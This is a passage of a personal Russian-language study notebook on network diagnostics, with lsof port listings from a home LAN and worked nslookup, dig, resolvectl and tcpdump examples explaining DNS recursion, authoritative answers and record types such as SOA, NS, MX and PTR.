avahi-dae  632           avahi   13u  IPv6  20363      0t0  UDP *:mdns
avahi-dae  632           avahi   14u  IPv4  20364      0t0  UDP *:55176
avahi-dae  632           avahi   15u  IPv6  20365      0t0  UDP *:51115
NetworkMa  638            root   23u  IPv6  22073      0t0  UDP LnxPC:dhcpv6-client
NetworkMa  638            root   28u  IPv4  22864      0t0  UDP vichonor:bootpc->192.168.100.1:bootps
ntpd       797             ntp   16u  IPv6  20849      0t0  UDP *:ntp
ntpd       797             ntp   17u  IPv4  20852      0t0  UDP *:ntp
ntpd       797             ntp   18u  IPv4  20856      0t0  UDP localhost:ntp
ntpd       797             ntp   19u  IPv6  20858      0t0  UDP ip6-localhost:ntp
ntpd       797             ntp   23u  IPv6  22581      0t0  UDP LnxPC:ntp
ntpd       797             ntp   24u  IPv4  23931      0t0  UDP vichonor:ntp
sshd       805            root    3u  IPv4  21617      0t0  TCP *:ssh (LISTEN)
sshd       805            root    4u  IPv6  21628      0t0  TCP *:ssh (LISTEN)
sshd      1481            root    4u  IPv4  24139      0t0  TCP vichonor:ssh->192.168.100.13:49860 (ESTABLISHED)
sshd      1489             oem    4u  IPv4  24139      0t0  TCP vichonor:ssh->192.168.100.13:49860 (ESTABLISHED)
cupsd     2354            root    6u  IPv6  30285      0t0  TCP ip6-localhost:ipp (LISTEN)
cupsd     2354            root    7u  IPv4  30286      0t0  TCP localhost:ipp (LISTEN)
cups-brow 2355            root    7u  IPv4  30302      0t0  UDP *:631

sudo lsof -i -n // результат сканирования портов без разрешения адресов в поле NAME
COMMAND    PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r  625 systemd-resolve   13u  IPv4  20653      0t0  UDP 127.0.0.53:domain
systemd-r  625 systemd-resolve   14u  IPv4  20654      0t0  TCP 127.0.0.53:domain (LISTEN)
....

sudo lsof -i:22 // инф о взаимодействии по открытому порту 22
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd     810 root    3u  IPv4  21402      0t0  TCP *:ssh (LISTEN)
sshd     810 root    4u  IPv6  21413      0t0  TCP *:ssh (LISTEN)
sshd    1568 root    4u  IPv4  23904      0t0  TCP lnxpc:ssh->vichonor:58185 (ESTABLISHED)
sshd    1576  oem    4u  IPv4  23904      0t0  TCP lnxpc:ssh->vichonor:58185 (ESTABLISHED)

sudo lsof -iUDP // информация о портах UDP
COMMAND   PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r 625 systemd-resolve   13u  IPv4  20653      0t0  UDP 127.0.0.53:domain
avahi-dae 638           avahi   12u  IPv4  20039      0t0  UDP *:mdns
avahi-dae 638           avahi   13u  IPv6  20040      0t0  UDP *:mdns
avahi-dae 638           avahi   14u  IPv4  20041      0t0  UDP *:37557
avahi-dae 638           avahi   15u  IPv6  20042      0t0  UDP *:52805
NetworkMa 642            root   23u  IPv6  20210      0t0  UDP [fe80::3b08:1704:f037:e972]:dhcpv6-client
NetworkMa 642            root   28u  IPv4  20429      0t0  UDP 192.168.100.8:bootpc->192.168.100.1:bootps
ntpd      800             ntp   16u  IPv6  21315      0t0  UDP *:ntp
ntpd      800             ntp   17u  IPv4  21318      0t0  UDP *:ntp
ntpd      800             ntp   18u  IPv4  21322      0t0  UDP 127.0.0.1:ntp
ntpd      800             ntp   19u  IPv6  21324      0t0  UDP [::1]:ntp
ntpd      800             ntp   23u  IPv4  22186      0t0  UDP 192.168.100.8:ntp
cups-brow 990            root    7u  IPv4  22554      0t0  UDP *:631
oem@LnxPC:~$ sudo lsof -iTCP // информация о портах TCP, устан-го соединения с notebook 192.168.100.13
COMMAND    PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r  625 systemd-resolve   14u  IPv4  20654      0t0  TCP localhost:domain (LISTEN)
sshd       810            root    3u  IPv4  21402      0t0  TCP *:ssh (LISTEN)
sshd       810            root    4u  IPv6  21413      0t0  TCP *:ssh (LISTEN)
cupsd      837            root    6u  IPv6  21528      0t0  TCP ip6-localhost:ipp (LISTEN)
cupsd      837            root    7u  IPv4  21529      0t0  TCP localhost:ipp (LISTEN)
sshd      1568            root    4u  IPv4  23904      0t0  TCP vichonor:ssh->192.168.100.13:58185 (ESTABLISHED)
sshd      1576             oem    4u  IPv4  23904      0t0  TCP vichonor:ssh->192.168.100.13:58185 (ESTABLISHED)

C:\Users\victo>netstat -n //команда в windows, установл-го соед-я с ssh-сервером 192.168.100.8
Active Connections
  Proto  Local Address          Foreign Address        State
   ...
  TCP    192.168.100.13:58185   192.168.100.8:22       ESTABLISHED
   ...



 = = =  = =   host (разрешение ДОМЕННОГО ИМЕНИ адРЕСА) = = = =  = =
host ya.ru // dns-разрешение ya.ru у сервера, определенного /etc/resolv.conf или определенного по DHCP
           структура /etc/resolv.conf  // см ниже "= = = = nsswitch.conf   resolv.conf = ="
ya.ru has address 77.88.55.242
ya.ru has address 5.255.255.242
ya.ru has IPv6 address 2a02:6b8::2:242
ya.ru mail is handled by 10 mx.yandex.ru.

host ya.ru 8.8.8.8// dns-разрешение ya.ru у сервера 8.8.8.8



= = = = = = = DNS nslookup ОДИНАКОВО РАБОТАЕТ В WinNT и Linux  = = = = = = = =
https://dns.google  - web интерфейс 8.8.8.8, аналог dig и dnslookup

https://losst.pro/kak-polzovatsya-nslookup?cmdurl=1 nslookup  
Команда nslookup
$ sudo nslookup опции домен сервер
Домен - это то доменное имя, для которого необходимо посмотреть информацию, а сервер - необязательный параметр, который указывает, что нужно использовать другой dns сервер. Основные опции nslookup:

-type - тип информации, которую хотим получить, возможные типы: txt, soa, ptr(pointer), ns, mx, mr, minfo, mg, mb, hinfo, gid, cname, a, any;
-port - другой порт DNS сервера;
-recurse - использоваться другие DNS серверы, если на этом нет ответа;
-retry - количество попыток получить нужную информацию;
-timeout - время между попытками запросов к серверу;
-fail - пробовать другой сервер имен, если этот вернул ошибку.
Если в ответе НЕ! сообщение "Non-authoritative answer" - Ответ считается авторитетным, только 
если наш DNS сервер имеет полную информацию о зоне, для рассматриваемой области (т.е. NS1 и NSn,в т.ч.SOA) 
Чаще всего, у нашего сервера будет не вся информация, а кэш последнего ответа от авторитетного сервера.
 Такая информация считается не авторитетной, хотя она была получена из авторитетного источника,
 но сам DNS сервер таковым не считается.
Первоисточник информации о домене, это его NS сервера. Вы можете их получить, использовав 
 команду с опцией 

nslookup  onliner.by 8.8.4.4 // A-запрос (-type=A) на 8.8.4.4
Server:         8.8.4.4
Address:        8.8.4.4#53
Non-authoritative answer:
Name:   onliner.by
Address: 178.124.129.116

nslookup -type=ns ya.ru  // запрос ns (-type=ns) на сервер по умолчанию, через 127.0.0.53 демон кеширования имен
Server:         127.0.0.53  // если не задать адрес dns сервера явно, будет взят из /etc/resolv.conf 
Address:        127.0.0.53#53 // 
Non-authoritative answer:
ya.ru   nameserver = ns2.yandex.ru.
ya.ru   nameserver = ns1.yandex.ru.
Authoritative answers can be found from:
ns2.yandex.ru   internet address = 93.158.134.1


https://www.youtube.com/watch?v=no9yc-BHaFA Созыкин "Рекурсивные запросы к DNS серверам"
Корневые серверы . (ROOT) , а также серверы зон (.com .by ..) не отвечают на рекурсивные запросы от клиентов!!
На рекурсивные запросы от клиентов отвечают только серверы DNS-resolverы (далее они обращаются с 
    ИТЕРАТИВНЫМИ запросами к корневым серверам см ниже подробно Кетова)

nslookup -type=ns . # запрос A и AAAA конерневых DNS серверов ROOT
                    # локальный DNS-resolver 192.168.100.1:53 домашней сети отратился к 
                    # к серверу БТК и тот выдал информацию 
192.168.100.10	192.168.100.1	DNS	60	Standard query 0x55c9 NS <Root>
192.168.100.1	192.168.100.10	DNS	534	Standard query response 0x55c9 NS <Root> NS i.root-servers.net NS j.root-servers.net NS g.root-servers.net NS h.root-servers.net NS a.root-servers.net NS d.root-servers.net NS b.root-servers.net NS k.root-servers.net NS c.root-servers.net NS f.root-servers.net NS e.root-servers.net NS m.root-servers.net NS l.root-servers.net A 198.41.0.4 A 170.247.170.2 A 192.33.4.12 A 199.7.91.13 A 192.203.230.10 A 192.5.5.241 A 192.112.36.4 A 198.97.190.53 A 192.36.148.17 A 192.58.128.30 A 193.0.14.129 A 199.7.83.42 A 202.12.27.33 AAAA 2001:503:ba3e::2:30 AAAA 2801:1b8:10::b
при обращении клиента с рекурсивным запросом  клиента указан флаг " Recursion desired", 
               DNS-resolver отвечает пакетом с флагом " Server can do recursive queries"
Internet Protocol Version 4, Src: 192.168.100.10, Dst: 192.168.100.1
User Datagram Protocol, Src Port: 44018, Dst Port: 53
Domain Name System (query)
    Transaction ID: 0x55c9
    Flags: 0x0100 Standard query
        .... ...1 .... .... = Recursion desired: Do query recursively
Internet Protocol Version 4, Src: 192.168.100.1, Dst: 192.168.100.10
User Datagram Protocol, Src Port: 53, Dst Port: 44018
Domain Name System (response)
    Flags: 0x8180 Standard query response, No error
        .... ...1 .... .... = Recursion desired: Do query recursively
        .... .... 1... .... = Recursion available: Server can do recursive queries
 
ЕСЛИ ОБРАТИТЬСЯ НАПРЯМУЮ с рекурсивным запросом разрешения имени zala.by к корневому серверу
    a.root 198.41.0.4 (nslookup -type=ns zala.by 198.41.0.4), то он: 
192.168.100.10	198.41.0.4	DNS	67	Standard query 0x32a1 NS zala.by
198.41.0.4	192.168.100.10	DNS	371	Standard query response 0x32a1 NS zala.by NS dns2.tld.becloudby.com
   NS dns1.tld.becloudby.com NS dns4.tld.becloudby.com NS  dns3.tld.becloudby.com 
    NS dns7.tld.becloudby.com A 93.125.25.73 AAAA 2a00:c827:a:3::2 A 93.125.25.72 AAAA 2a00:c827:a:2::2 A 31.44.1.137 AAAA 2a0e:b81:8001:1001::2 A 185.98.83.4 AAAA 2a01:ba80:e:c:1::4c A 31.44.5.245
1) Ответит во флаге, что не поддерживает   рекурсивные запросы
Internet Protocol Version 4, Src: 198.41.0.4, Dst: 192.168.100.10
User Datagram Protocol, Src Port: 53, Dst Port: 33588
Domain Name System (response)
    Flags: 0x8100 Standard query response, No error
        .... ...1 .... .... = Recursion desired: Do query recursively
        .... .... 0... .... = Recursion available: Server can't do recursive queries
2) В ответ выдаст итеративный ответ -  имена и адреса серверов, которые отвечают за зону by
nslookup -type=ns zala.by 198.41.0.4
Server:         198.41.0.4
Non-authoritative answer: *** Can't find zala.by: No answer
Authoritative answers can be found from:
by      nameserver = dns2.tld.becloudby.com.
by      nameserver = dns1.tld.becloudby.com.
by      nameserver = dns4.tld.becloudby.com. ....
dns2.tld.becloudby.com  internet address = 93.125.25.73
dns2.tld.becloudby.com  has AAAA address 2a00:c827:a:3::2 ......
Далее по цепочке можно самостоятельно обращаться c Итеративными запросами -type=ns к серверам, 
  пока не найдем последний в цепочке и ему следует задать запрос -type=A


   * SOA *
// wiki Запись SOA (Start of Authority) или "начальная запись зоны" указывает, на каком сервере хранится 
эталонная информация о данном домене, содержит контактную информацию лица, о
тветственного за данную зону, тайминги (параметры времени) кеширования зонной информации и 
взаимодействия DNS-серверов.

https://infra.gnulinux.pro/ru/latest/infra/12/12._%D0%9E%D1%81%D0%BD%D0%BE%D0%B2%D1%8B_DNS_%D1%87.1.html
https://www.youtube.com/watch?v=MeGNTQlsM_w&t=494s   - все типы записей DNS смотри!!!
Авторитеные (авторитативные NS,MX..) серверы - !!нерекурсивные (9 мин видео),чтобы избежать риска сделать 
  их средствами распределенных сетевых атак (DDoS , т.е. будут использовать ваш сервер для запросов на  
  другие сервера, чтобы нагрузить их), хотя технически можно сделать чтобы они отвечали и на рекурсивные запросы

nslookup -type=SOA pikabu.ru ns1.google.com #примеры отказов авторитативных серверов отвечть на рекурс запрсы
Server:  ns1.google.com
Address:  216.239.32.10
*** ns1.google.com can't find pikabu.ru: Query refused
nslookup -type=ns mts.by ns1.yandex.ru
Server:  UnKnown
Address:  213.180.193.1
*** UnKnown can't find mts.by: Query refused

  DNS Домен vs DNS Зона - (10 мин видео)  
 Грубо говоря, домены это про области имён, а зоны -  про то, кто отвечает и как это технически реализовано.
 Типы записей DNS - это типы услуг. Пользователи обращаются к DNS серверу за этими услугами, но все эти 
 услуги так или иначе завязаны на авторитете. Эти полномочия и доверие распространяются не на всё вокруг,
 а только на ограниченную область, которая называется зоной. Т.е. есть авторитет - отвечает за зону.
 К примеру, есть домен yandex.ru: nslookup -type=SOA yandex.ru
 У него авторитетным DNS сервером является ns1.yandex.ru, а адресом администратора sysadmin@yandex-team.ru.
 А есть домен cloud.yandex.ru: 
 nslookup -type=SOA cloud.yandex.ru
Non-authoritative answer:
cloud.YANDEX.ru
    primary name server = ns3.yandex.ru
    responsible mail addr = sysadmin.yandex.ru # email записывется так, что первая слева"." читать "@"

 У него SOA другой, глвн DNS сервер - ns3.yandex.ru и адрес администратора другой - sysadmin@yandex.ru.
 cloud.yandex.ru находится в домене yandex.ru, но вот ЗОНА - другая. Т.е. условно есть некая организация,
 у неё есть подразделения,подразделения администрируют разные люди.И чтобы они могли добавлять любые 
 записи в рамках своего поддомена можно наделить их авторитетом этой зоны. 
 Это называется ДЕЛЕГИРОВАНИЕМ домена. Делегирование домена работает через NS записи, которые 
 указывают на DNS сервера.



{https://powerdmarc.com/what-is-dns-ns-record-name-server-records/
NS Record  An NS (nameserver) record specifies the authoritative name servers for a domain.
The authoritative name servers are the servers that are used to resolve queries to hostnames
and determine which IP addresses should be used to access a given ser}

nslookup -type=ptr 77.88.8.8  8.8.8.8//PTR-обратное преобразование 77.88.8.8 dns yandex в домен.имя
Server:         8.8.8.8
Address:        8.8.8.8#53
Non-authoritative answer: // !!
8.8.88.77.in-addr.arpa  name = dns.yandex.ru.

Authoritative answers can be found from:
nslookup 194.67.215.125 //выполнить PTR обратное преобразование IP адреса в домен.
nslookup -type=any losst.pro //просмотр всех доступных записей DNS:

nslookup -type=mx ya.ru //просмотр записей DNS о почтовых серверах домена
Server:         127.0.0.53
Address:        127.0.0.53#53
Non-authoritative answer:
ya.ru   mail exchanger = 10 mx.yandex.ru.
Authoritative answers can be found from:
mx.yandex.ru    internet address = 77.88.21.249
mx.yandex.ru    has AAAA address 2a02:6b8::311

  - - - - - - Авторитативные DNS ответы (см ниже подробнее в секции dig)  ------- - - 
 //Кетов DNS4 видео "авторитативные ответы" - получнаются из NS-серверов (в тч SOA) имен зон/домена, 
                     "неавторитативные ответы" - полчают из  кэширующех серверов
nslookup -type=ns onliner.by
Server:		127.0.0.53
Address:	127.0.0.53#53
Non-authoritative answer:   //!!!! 
onliner.by	nameserver = u2.hoster.by.
onliner.by	nameserver = u1.hoster.by.

Authoritative answers can be found from:  //!!!!
u2.hoster.by	internet address = 185.179.82.101
u1.hoster.by	internet address = 93.125.30.201

nslookup  onliner.by 185.179.82.101 // выполнить тот же запрос но с Authoritative сервера
Server:		185.179.82.101
Address:	185.179.82.101#53
Name:	onliner.by   //  Authoritative ответ от SOA сервера имен!
Address: 178.124.129.114
Name:	onliner.by
Address: 178.124.129.116
Name:	onliner.by
Address: 178.124.129.112


nslookup -type=soa onliner.by 8.8.8.8 // запрос об авторитативных серверах имен у 8.8.8.8 
Server:         8.8.8.8
Address:        8.8.8.8#53
Non-authoritative answer:
onliner.by
        origin = u1.hoster.by
        mail addr = support.hoster.by
        serial = 2023073101 //!!! дата последнего обновления файла с ресурсными записями
        refresh = 43200
        retry = 7200
        expire = 604800
        minimum = 600

nslookup -type=any datacenter.by 8.8.8.8
Server:  dns.google
Address:  8.8.8.8
Non-authoritative answer:
datacenter.by   MX preference = 10, mail exchanger = mx2.dc.beltelecom.by
datacenter.by
        primary name server = ns1.datacenter.by
        responsible mail addr = support.dc.beltelecom.by
        serial  = 2021102991  //!!! дата последнего обновления файла с ресурсными записями
        refresh = 3600 (1 hour)
        retry   = 3600 (1 hour)
        expire  = 604800 (7 days)
        default TTL = 86400 (1 day)
datacenter.by   nameserver = ns2.datacenter.by
datacenter.by   nameserver = ns1.datacenter.by
datacenter.by   internet address = 93.84.113.2

= = END DNS nslookup  = 
	
 = = dig аналог nslookp c расширенными функциями = = 

dig @8.8.8.8 -t mx beltelecom.by # Прямой запрос о записях mx (почтовых серверах) домена 
;; QUESTION SECTION:
;beltelecom.by.                 IN      MX
;; ANSWER SECTION:
beltelecom.by.          972     IN      MX      20 mx2.beltelecom.by.
beltelecom.by.          972     IN      MX      10 mx1.beltelecom.by.

dig @8.8.8.8 -t a  mx1.beltelecom.by  # Прямой запрос A об IP адресе mx1.beltelecom.by 
;; QUESTION SECTION:
;mx1.beltelecom.by.             IN      A
;; ANSWER SECTION:
mx1.beltelecom.by.      21600   IN      A       93.84.112.11

dig @8.8.8.8 -x 93.84.112.11 # ОБратный PTR запрос к серверу об URI доменном имене  c 93.84.112.11
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;11.112.84.93.in-addr.arpa.     IN      PTR
;; ANSWER SECTION:
11.112.84.93.in-addr.arpa. 21600 IN     PTR     mx1.beltelecom.by.

dig @8.8.8.8 -t NS beltelecom.by # Прямой запрос NS об серверах имен  домена beltelecom.by 
;; QUESTION SECTION:
;beltelecom.by.                 IN      NS
;; ANSWER SECTION:
beltelecom.by.          21600   IN      NS      dns.belpak.by.
beltelecom.by.          21600   IN      NS      nsrv.belpak.by.


 dig @8.8.8.8 byfly.by any // запрос любой any инф о доменном имени с 8.8.8.8 
 //через dump видно, что запрос идет от 192.168.100.8(lnxmint) к  8.8.8.8 
;; QUESTION SECTION:
;byfly.by.                      IN      ANY
;; ANSWER SECTION: // ВСЕ НИЖЕ -> РЕСУРСНЫЕ ЗАПИСИ !!!
byfly.by.               3600    IN      AAAA    2a02:2208:1:1::89
byfly.by.               3600    IN      SOA     ns1.datacenter.by. support.dc.beltelecom.by. 2021092702 3600 3600 604800 86400
byfly.by.               3600    IN      NS      ns1.datacenter.by.
byfly.by.               3600    IN      NS      ns2.datacenter.by.
byfly.by.               3600    IN      A       86.57.251.89
byfly.by.               3600    IN      MX      10 mail.byfly.by.
;; Query time: 63 msec
;; SERVER: 8.8.8.8#53(8.8.8.8) (TCP)
;; WHEN: Mon Jul 10 18:26:11 +03 2023
;; MSG SIZE  rcvd: 207

dig @8.8.8.8 byfly.by A // запрос A (о ipv4) о доменном имени с 8.8.8.8 
  //через dump видно, что запрос идет от 192.168.100.8(lnxmint) к  8.8.8.8 
;; QUESTION SECTION:
;byfly.by.                      IN      A
;; ANSWER SECTION:
byfly.by.               2517    IN      A       86.57.251.89

dig  byfly.by A // запрос с DNS-по умолчанию (из /etc/resolve.conf) через демон кеширования 127.0.0.53
  //через dump видно, что запрос идет от 192.168.100.8 к 192.168.100.1 (а далее через dns от brasa)   
 // Если на /etc/resolve.conf  первым поставить "nameserver 8.8.8.8", а не "nameserver 127.0.0.53"
 //то через dump видно, что запросы идту от 192.168.100.8 к 8.8.8.8
;; QUESTION SECTION:
;byfly.by.                      IN      A
;; ANSWER SECTION:
byfly.by.               28      IN      A       86.57.251.89

// CNAME - каноническое имя - имя ресурса, под которым ресурс именуется внутри организации, администрируемой ресурс 
//wiki Запись CNAME (canonical name record) или каноническая запись имени (псевдоним) используется для перенаправления на другое имя.
 // Кетов видео о dns1 - см ниже по  ftpbyflyby.belpak.by. также можно получить доступ к каталогу с 82.209.230.71

dig  ftp.byfly.by.  
;; QUESTION SECTION:
;ftp.byfly.by.                  IN      A
;; ANSWER SECTION:
ftp.byfly.by.           292     IN      CNAME   ftpbyflyby.belpak.by.
ftpbyflyby.belpak.by.   60      IN      A       82.209.230.71

wiki Запись PTR (pointer) обратная DNS-запись или запись указателя связывает IP-адрес хоста с его
каноническим именем.Многие серверы-получатели электронной почты могут проверять наличие PTR-записи
для хоста, с которого происходит отправка. В этом случае PTR-запись для IP-адреса должна 
соответствовать имени отправляющего почтового сервера, которым он представляется в процессе SMTP-сессии.

dig -t NS . > rootzone // получить сведения о   серверах NS имен корневой зоны, сохранить в файле
;; QUESTION SECTION:
;.                              IN      NS
;; ANSWER SECTION:
.                       217992  IN      NS      a.root-servers.net.
...  
.                       217992  IN      NS      m.root-servers.net.


dig . any // получить сведения о  корневом сервере DNS  
 //кетов видео dns1 2.1 2.2  
  nstld.verisign-grs.com - на сам деле email (nstld@verisign-grs.com) админа домена 
wiki Запись SOA (Start of Authority) или начальная запись зоны указывает, на каком сервере хранится 
эталонная информация о данном домене, содержит контактную информацию лица, о
тветственного за данную зону, тайминги (параметры времени) кеширования зоновой информации и 
взаимодействия DNS-серверов.


//Кетов видео "dns 1" серверы корневой зоны (ROOT) . знают инф-цию о серверах зоны com. org. net. ... us. ru. by. ... 
Сервер DNS кэширующий (локальный NS = LNS) или DNS-resolver к которому непосредственно обращаются DNS-клиенты. 
Клиенты DNS (ip-хосты) делают к  кэширующему серверу (LNS) РЕКУРСИВНЫЕ запросы.
Кэширующие серверы LNS делают к серверам зон ИТЕРАТИВНЫЕ запросы (ИТЕРАТИВНЫЕ значит:сначала обращение к серверу 
зоны ROOT "." , далее к серверу зоны "by.", затем зоны "beltelecom.by" и т.д. ) и временно сохраняют /кэшируют информацию о ресурсах в своей памяти. 
На Кэширующих серверах неодходимо настроить IP-адреса 13 корневых серверов  (см "dig -t NS ."), всю остальные данные кэширующие серверы 
получат через ИТЕРАТИВНЫЕ запросы к корненвым серверам
 //кетов видео  "2.1 2.2"    nstld.verisign-grs.com - на сам деле email (nstld@verisign-grs.com) админа домена 
 // сервер SOA  - сервер ОТВЕСТВЕННЫЙ за зону  
wiki Запись SOA (Start of Authority) или начальная запись зоны указывает, на каком сервере хранится 
эталонная информация о данном домене, содержит контактную информацию лица, о
тветственного за данную зону, тайминги (параметры времени) кеширования зонной информации и 
взаимодействия DNS-серверов.
dig -t SOA . //  получить сведения об авторитативном  сервере корневой зоны (ROOT) .
;; QUESTION SECTION:
;.                              IN      SOA
;; ANSWER SECTION:
.                       7193    IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2023080100 1800 900 604800 86400
   # nstld.verisign-grs.com - на сам деле email (nstld@verisign-grs.com) админа домена 


dig @8.8.8.8 -t SOA by.// получить сведения об авторитативном/ОТВЕТСТВЕННОМ сервере зоны by.
; <QUESTION SECTION:
;by.                            IN      SOA
;; ANSWER SECTION:
by.                     3600    IN      SOA     dns1.tld.becloud.by. support.becloud.by. 2308012010 3600 600 604800 3600

dig @8.8.8.8 -t any beltelecom.by. // получить сведения обо всех  серверах зоны by.
;; QUESTION SECTION:
;beltelecom.by.                 IN      ANY
;; ANSWER SECTION:
beltelecom.by.          21600   IN      SOA     nsrv.belpak.by. dns-admin.belpak.by. 2023080101 43200 7200 1209600 172800
beltelecom.by.          21600   IN      TXT     "_globalsign-domain-verification=ndoJqojZDRawkoYwjSzmz7gffTks6sUxcdHZwC2txQ"
beltelecom.by.          21600   IN      TXT     "v=spf1 mx a -all"
beltelecom.by.          21600   IN      MX      10 mx1.beltelecom.by.
beltelecom.by.          21600   IN      MX      20 mx2.beltelecom.by.
beltelecom.by.          21600   IN      NS      dns.belpak.by.
beltelecom.by.          21600   IN      NS      nsrv.belpak.by.
beltelecom.by.          21600   IN      A       86.57.251.89
beltelecom.by.          21600   IN      AAAA    2a02:2208:1:1::89

https://ru.wikipedia.org/wiki/DNS Ключевы понятия DNS:
Доме́н (англ. domain «область») — узел в дереве имён, вместе со всеми подчинёнными ему узлами 
   (если таковые имеются), то есть именованная ветвь или поддерево в дереве имён.
   Структура доменного имени отражает порядок следования узлов в иерархии;
   доменное имя читается слева направо от младших доменов к доменам высшего уровня (в порядке
   повышения значимости): вверху находится корневой домен (имеющий идентификатор «.»(точка)), 
   ниже идут домены первого уровня (доменные зоны), затем — домены второго уровня, третьего и т. д. 
   (например, для адреса ru.wikipedia.org. домен первого уровня — org, второго — wikipedia, третьего — ru).
   DNS позволяет не указывать точку корневого домена.
Поддомен (англ. subdomain) — подчинённый домен (например, wikipedia.org — поддомен домена org,
   а ru.wikipedia.org — поддомен домена wikipedia.org). Теоретически такое деление может достигать глубины 127 
   уровней, а каждая метка может содержать до 63 символов, пока общая длина вместе с точками
   не достигнет 254 символов. Но на практике регистраторы доменных имён используют 
   более строгие ограничения. Например, если у вас есть домен вида mydomain.ru, вы можете 
   создать для него различные поддомены вида mysite1.mydomain.ru, mysite2.mydomain.ru и т. д.
Ресурсная запись (Записи DNS) — единица хранения и передачи информации в DNS. Каждая ресурсная запись
   имеет имя (то есть привязана к определённому доменному имени, узлу в дереве имён), тип и поле 
   данных, формат и содержание которого зависит от типа.
Ресурсные записи (англ. resource records, RR), — единицы хранения и передачи информации в DNS. Каждая ресурсная запись состоит из следующих полей[3]:
имя (NAME) — доменное имя, к которому привязана или которому «принадлежит» данная ресурсная запись,
тип (TYPE) ресурсной записи — определяет формат и назначение данной ресурсной записи,
класс (CLASS) ресурсной записи; теоретически считается, что DNS может использоваться не только с TCP/IP, ноис другими типами сетей, код в поле класс определяет тип сети[3],
TTL (Time To Live) — допустимое время хранения данной ресурсной записи в кэше неответственного DNS-сервера,
длина поля данных (RDLEN),
поле данных (RDATA), формат и содержание которого зависит от типа записи.
Зона — часть дерева доменных имён (включая ресурсные записи), размещаемая как единое целое 
на некотором сервере доменных имён (DNS-сервере, см. ниже), а чаще — одновременно на нескольких 
серверах . Целью выделения части дерева в отдельную зону является передача ответственности 
за соответствующий домен другому лицу или организации. Это называется Делегированием
 = END dig  =


https://dns.google/ - web аналог dig !! 
выполнить ptr запрос  71.230.209.82.in-addr.arpa
Result for 71.230.209.82.in-addr.arpa/PTR with DNSSEC validation and without DNSSEC detail:
{
  "Status": 0 /* NOERROR */,
  "TC": false,
  "RD": true,
  "RA": true,
  "AD": false,
  "CD": false,
  "Question": [
    {
      "name": "71.230.209.82.in-addr.arpa.",
      "type": 12 /* PTR */
    }
  ],
  "Answer": [
    {
      "name": "71.230.209.82.in-addr.arpa.",
      "type": 12 /* PTR */,
      "TTL": 21600,
      "data": "ftp.byfly.by."
    }
  ],
  "Comment": "Response from 86.57.169.34."

= = = nslookup в windows = = =
nslookup
> server 8.8.8.8
Default Server:  dns.google
Address:  8.8.8.8
> set type=soa 
> .  // запрос // запрос у сервера 8.8.8.8 !!!!!!
Server:  dns.google
Address:  8.8.8.8
Non-authoritative answer:
(root)
        primary name server = a.root-servers.net
        responsible mail addr = nstld.verisign-grs.com
        serial  = 2023080102
        refresh = 1800 (30 mins)
        retry   = 900 (15 mins)
        expire  = 604800 (7 days)
        default TTL = 86400 (1 day)

> set type=MX  
> mgts.by. 8.8.4.4 // запрос у сервера 8.8.4.4
Server:  [8.8.4.4]
Address:  8.8.4.4

> set type=PTR
> 82.209.230.71 8.8.8.8 
Server:  [8.8.8.8]
71.230.209.82.in-addr.arpa      name = ftp.byfly.by


= = resolvectl (аналог  nslookup с бо'льшими возможностями) = = 

man resolvectl, resolvconf - Resolve domain names, IPV4 and IPv6 addresses, DNS resource records, and services; introspect and reconfigure the DNS resolver

resolvectl status // запросить адрес текущего DNS сервера в системе linux. 
Global
       Protocols: -LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported
resolv.conf mode: stub

Link 2 (enp0s3)
    Current Scopes: DNS
         Protocols: +DefaultRoute +LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported
Current DNS Server: 192.168.100.1
       DNS Servers: 192.168.100.1 fe80::1%22022

// Отразит  "192.168.100.1", даже если вручную вписать "nameserver 8.8.8.8" и tcpdump 'udp port 53' -vn
   будет отображать обращение к 8.8.8.8, а не к 192.168.100.1
    192.168.100.9.50464 > 8.8.8.8.53: 57068+ A? byfly.by. (26)
16:20:55.321564 IP (tos 0x0, ttl 56, id 39321, offset 0, flags [none], proto UDP (17), length 70)
    8.8.8.8.53 > 192.168.100.9.50464: 57068 1/0/0 byfly.by. A 86.57.251.89 (42)


resolvectl query ya.ru
ya.ru: 77.88.55.242                            -- link: enp0s3
       5.255.255.242                           -- link: enp0s3
       2a02:6b8::2:242                         -- link: enp0s3
       (YA.ru)
-- Information acquired via protocol DNS in 35.4ms.
resolvectl query dns.google
dns.google: 2001:4860:4860::8888               -- link: enp0s3
            2001:4860:4860::8844               -- link: enp0s3
            8.8.8.8                            -- link: enp0s3
            8.8.4.4                            -- link: enp0s3
-- Information acquired via protocol DNS in 194.2ms.
-- Data is authenticated: no; Data was acquired via local or encrypted transport: no
-- Data from: network

resolvectl query 8.8.8.8
8.8.8.8: dns.google                            -- link: enp0s3
-- Information acquired via protocol DNS in 7.7ms.

 = end resolvectl  =

= = tcpdump  = =
Как пользоваться tcpdump  https://losst.pro/kak-polzovatsya-tcpdump
tcpdump -i enp0s3 -n icmp // дамп трафика icmp  на интерейсе ("-n" не преобра URI через DSN)
tcpdump -i enp0s3 -n udp and port 53 ; dig ya.ru
23:52:39.807612 IP 192.168.100.12.51856 > 192.168.100.1.53: 16427+ A? ya.ru. (23)
23:52:39.999216 IP 192.168.100.1.53 > 192.168.100.12.51856: 16427 2/0/0 A 5.255.255.242, A 77.88.55.242 (58)
$ tcpdump опции -i интерфейс фильтры

При вызове обязательно нужно передать интерфейс, который будете отслеживать. Если интерфейс не указать, то будет использован первый в списке. Опции настраивают отображение и основные возможности утилиты, а фильтры позволяют отсеять ненужные пакеты. А теперь рассмотрим основные опции:

-A - выводить все пакеты в формате ASCII;
-c - закрыть программу после перехвата n-ого количества пакетов;
-C - при записи пакетов в файл, проверять размер файла, и если он больше заданного - создать новый файл;
-D - вывести список доступных сетевых интерфейсов;
-e - выводить информацию уровня соединения для каждого пакета, это может быть полезно, например, для отображения MAC адреса;
-f - выводить доменное имя для ip адресов;
-F - читать пакеты из файла, а не интерфейса;
-G - создавать новый файл лога через указанный промежуток времени;
-H - обнаруживать заголовки 802.11s;
-i - имя интерфейса для перехвата пакетов. Вы можете захватывать пакеты со всех интерфейсов, для этого укажите any;
